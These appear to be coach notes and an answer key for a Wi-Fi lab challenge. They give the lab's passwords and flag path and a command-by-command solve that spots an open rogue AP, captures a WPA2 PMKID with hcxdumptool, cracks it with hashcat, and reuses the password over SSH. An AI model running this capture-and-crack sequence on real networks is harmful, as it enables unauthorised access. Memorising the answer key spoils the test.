# Coach context — wifi-t3-pmkid-rogue

## Ground truth
- `wifilab01` 10.x.10.25 — `wifi`/`WifiLab-24!` (sudo scoped to wireless tools only).
- Radios: wlan0 AP `secure-net` ch6 WPA2 (PSK `dragon!99`, pmkid=1),
  wlan2 AP `free-wifi` ch11 open (rogue), wlan1 attack radio.
- `secadmin` password = `dragon!99`; flag `/home/secadmin/flag.txt`.
- Command flags: `/home/wifi/rogue.txt` greps `free-wifi`;
  `/home/wifi/pmkid.22000` exists non-empty.

## Expected solve
```bash
ssh wifi@10.x.10.25
sudo airodump-ng wlan1               # both APs: secure-net WPA2, free-wifi OPN
echo "free-wifi" > /home/wifi/rogue.txt
sudo hcxdumptool -i wlan1 --enable_status=15 -o /home/wifi/out.pcapng
# or: --filterlist_ap to target secure-net only
hcxpcapngtool -o /home/wifi/pmkid.22000 /home/wifi/out.pcapng
hashcat -m 22000 /home/wifi/pmkid.22000 /opt/wifi/wordlist.txt
# → dragon!99
sshpass -p 'dragon!99' ssh secadmin@localhost 'cat ~/flag.txt'
```

## Coach guidance
- hcxdumptool can be noisy — if it won't harvest, suggest filterfile or
  letting it run ~60s; hwsim AP responds immediately.
- pmkid=1 in hostapd config makes PMKID available on request — that's the
  vuln being exercised; airmon not needed for hcxdumptool (it manages the
  interface itself — actually hcxdumptool wants the interface already up).
- If wlan1 conflicts: `sudo iw dev` to check state; hcxdumptool -i wlan1.
- Rogue identification: open encryption + not in authorized list — the
  survey note in /opt/wifi lists `secure-net` only.
